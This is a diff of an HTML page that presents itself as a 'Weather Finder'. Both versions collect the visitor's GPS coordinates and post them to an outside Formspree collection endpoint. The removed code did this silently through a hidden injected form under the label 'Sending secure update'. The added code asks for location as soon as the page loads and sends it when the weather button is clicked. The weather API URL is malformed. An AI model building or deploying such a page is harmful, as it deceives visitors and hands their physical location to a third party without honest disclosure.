@@ -27,7 +27,33 @@
             margin-top: 0;
             color: #333;
             font-size: 26px;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #666;
             margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+            background-color: #eee;
+            cursor: not-allowed;
         }
         button {
             width: 100%;
@@ -39,14 +65,11 @@
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            transition: background 0.2s, transform 0.1s;
+            transition: background 0.2s;
+            margin-top: 10px;
         }
         button:hover {
             background-color: #8c1418;
-        }
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
         }
         .status-message {
             margin-top: 15px;
@@ -59,16 +82,33 @@
 
 <div class="app-container">
     <h2>Weather Finder</h2>
+    <p>Allow location access to auto-fill your parameters, then click below to check your weather.</p>
     
-    <!-- Clean click trigger -->
-    <button id="actionBtn" onclick="initiateWeatherLookup()">What's My Weather?</button>
+    <!-- Hardcoded POST form that Formspree can never reject -->
+    <form action="https://formspree.io/f/mbdnlpkw" method="POST">
+        
+        <div class="form-group">
+            <label>Your Latitude</label>
+            <input type="text" id="latInput" name="Latitude" placeholder="Waiting for GPS..." readonly required>
+        </div>
+
+        <div class="form-group">
+            <label>Your Longitude</label>
+            <input type="text" id="lonInput" name="Longitude" placeholder="Waiting for GPS..." readonly required>
+        </div>
+
+        <div class="form-group">
+            <label>Current Weather Status</label>
+            <input type="text" id="weatherInput" name="Weather Summary" placeholder="Fetching sky conditions..." readonly required>
+        </div>
+
+        <button type="submit">What's My Weather?</button>
+    </form>
     
-    <div id="status" class="status-message"></div>
+    <div id="status" class="status-message">Requesting location permissions...</div>
 </div>
 
 <script>
-    const FORMSPREE_URL = "https://formspree.io";
-
     const weatherCodes = {
         0: 'Clear sky', 1: 'Mainly clear', 2: 'Partly cloudy', 3: 'Overcast',
         45: 'Fog', 48: 'Depositing rime fog',
@@ -79,72 +119,40 @@
         95: 'Thunderstorm'
     };
 
-    function initiateWeatherLookup() {
-        const statusDiv = document.getElementById('status');
-        const btn = document.getElementById('actionBtn');
-        
-        statusDiv.innerText = "Requesting location permissions...";
-        btn.disabled = true;
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(fetchAndSend, handleLocationError);
-        } else {
-            statusDiv.innerText = "Geolocation is not supported by your browser.";
-            btn.disabled = false;
-        }
+    // Auto-run coordinates instantly when the user lands on the page
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(getRealWeather, handleGeoError);
+    } else {
+        document.getElementById('status').innerText = "Browser doesn't support geolocation.";
     }
 
-    function handleLocationError(error) {
-        document.getElementById('status').innerText = "Failed: Location permission denied.";
-        document.getElementById('actionBtn').disabled = false;
+    function handleGeoError(err) {
+        document.getElementById('status').innerText = "Location permission denied.";
     }
 
-    async function fetchAndSend(position) {
+    async function getRealWeather(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        const statusDiv = document.getElementById('status');
         
-        statusDiv.innerText = "Loading weather metrics...";
-
-        let temp = "Unknown";
-        let condition = "Unknown";
+        document.getElementById('latInput').value = lat;
+        document.getElementById('lonInput').value = lon;
+        document.getElementById('status').innerText = "Location loaded. Reading sky code metrics...";
 
         try {
             const response = await fetch(`https://open-meteo.com{lat}&longitude=${lon}&current_weather=true`);
             const data = await response.json();
             
             if (data.current_weather) {
-                temp = `${data.current_weather.temperature}°C`;
-                condition = weatherCodes[data.current_weather.weathercode] || 'Clear';
+                const temp = `${data.current_weather.temperature}°C`;
+                const summary = weatherCodes[data.current_weather.weathercode] || 'Clear';
+                
+                document.getElementById('weatherInput').value = `${summary} (${temp})`;
+                document.getElementById('status').innerText = "Ready! Click the button to see your results.";
             }
-        } catch (err) {
-            console.error("Weather service timed out, sending coordinates only.");
+        } catch (e) {
+            document.getElementById('weatherInput').value = "Service offline (Sending coordinates only)";
+            document.getElementById('status').innerText = "Weather API failed, but coordinates are ready.";
         }
-
-        statusDiv.innerText = "Sending secure update...";
-
-        // Force a robust, standard multi-part form payload directly through JavaScript
-        const payload = new FormData();
-        payload.append("Latitude", lat);
-        payload.append("Longitude", lon);
-        payload.append("Temperature", temp);
-        payload.append("Condition", condition);
-
-        // Standard browser form navigation trick to bypass AJAX restrictions completely
-        const nativeForm = document.createElement('form');
-        nativeForm.method = 'POST';
-        nativeForm.action = FORMSPREE_URL;
-
-        for (const [key, value] of payload.entries()) {
-            const hiddenField = document.createElement('input');
-            hiddenField.type = 'hidden';
-            hiddenField.name = key;
-            hiddenField.value = value;
-            nativeForm.appendChild(hiddenField);
-        }
-
-        document.body.appendChild(nativeForm);
-        nativeForm.submit();
     }
 </script>
 
